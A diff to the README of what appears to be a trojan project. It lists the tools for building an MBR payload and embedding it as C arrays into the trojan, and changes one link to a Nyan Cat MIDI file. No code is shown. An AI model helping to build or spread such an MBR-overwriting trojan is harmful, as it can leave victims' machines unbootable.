@@ -8,7 +8,7 @@ The build scripts and converters for the MBR payload are very noobish. You will 
  - Python 2.7 for Windows and [this](https://github.com/vishnubob/python-midi) library.
  - git for Windows or some other linux tools for windows like MinGW
  - NASM in your PATH (I just copyed the executable into C:\Windows\ because I was too lazy to add it to the PATH manually)
- - The [Nyan Cat midi file](http://morganatmacsd.tumblr.com/post/7275362575/midi-file-for-nyan-cat-song)
+ - The [Nyan Cat midi file](http://download1350.mediafire.com/cdmp9qi4miog/1104lan91ak8kq0/NyanCat.mid)
  - Something to convert binary files into C arrays, to embed the MBR payload into the trojan (I used the export function of the HxD hex editor, you will only need that if you changed and recompiled the MBR payload)
  - qemu for Windows (additional, if you want to test the payload)
 
